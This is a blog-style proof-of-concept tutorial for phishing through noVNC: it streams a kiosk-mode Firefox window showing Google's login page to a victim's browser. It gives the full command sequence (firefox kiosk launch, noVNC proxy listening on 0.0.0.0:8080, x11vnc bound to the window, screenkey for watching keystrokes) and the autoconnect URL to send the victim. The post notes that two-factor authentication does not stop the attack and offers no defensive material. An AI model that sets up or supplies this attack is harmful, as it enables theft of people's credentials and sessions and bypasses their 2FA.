### Introduction

On February 19, 2022, Mr. d0x a cybersecurity researcher introduced a method that uses VNC for phishing attacks. I was impressed by the cleverness of this idea.

### Background

VNC, or Virtual Network Computing, is a way to share screens and control another computer remotely. It works by installing a VNC server on the computer you want to control, and a VNC viewer on the device you're using to control it.

The goal is to share our screen, specifically our browser window, and make the victim believe they are controlling their own browser when they are actually connected to our computer.

By using a library called [noVNC](https://novnc.com/info.html), we can connect to VNC servers from modern web browsers. This phishing technique has several benefits over traditional phishing methods:

- We can record all keystrokes made by the victim
- We can watch in real-time what the victim is doing on a website
- Two-factor authentication will not protect against this type of attack

# PoC

First we lachnge Firefox, or any other browser in kiosk mode.

so, first what is kiosk mode?

Kiosk software is the system and user interface software designed for an interactive kiosk or Internet kiosk enclosing the system in a way that prevents user interaction and activities on the device outside the scope of execution of the netkiosk. 

Why do need kiosk mode?

Without kiosk mode, the vicitim might be able to control other parts of our attacking machine, that we probarly dont want to happen.

In the terminal, run:

```bash
firefox --kisok https://accounts.google.com
```

Now in a new terminal window, we will use noVNC.

noVNC is a VNC client library that can run on almost any browsers.

```bash
git clone https://github.com/novnc/noVNC
cd noVNC
./utils/novnc_proxy --listen 0.0.0.0:8080 --vnc localhost:5900
```

{% include figure.liquid loading="eager" path="assets/img/posts/2/2.png" class="img-fluid rounded z-depth-1" zoomable=true %}

now we need to get the id of Firefox proccess running, we can use `xwininfo | grep` run this command and select the firefox browser, the terminal will print the id back.

After we have the id, we will star a local vnc server with:

```bash
sudo apt update
sudo apt install x11vnc
x11vnc -id <firefox_window_id>
```

Almost done! Now all left to do is use some kind keylogger, we can use `screenkey` to see key presses by the victim in real time, (note: it will also show our own key presses so please be aware):

```
sudo apt install screenkey -y
screenkey
```

Now all left to do is open up the the browser from the vicitm and enter the following url: `http://<ip>:8080/vnc.html?autoconnect=true`

When  the vicitim will enter this url he will see the google accounts login page, without knowing it is a streaming video that he can interact with, this is crazy!
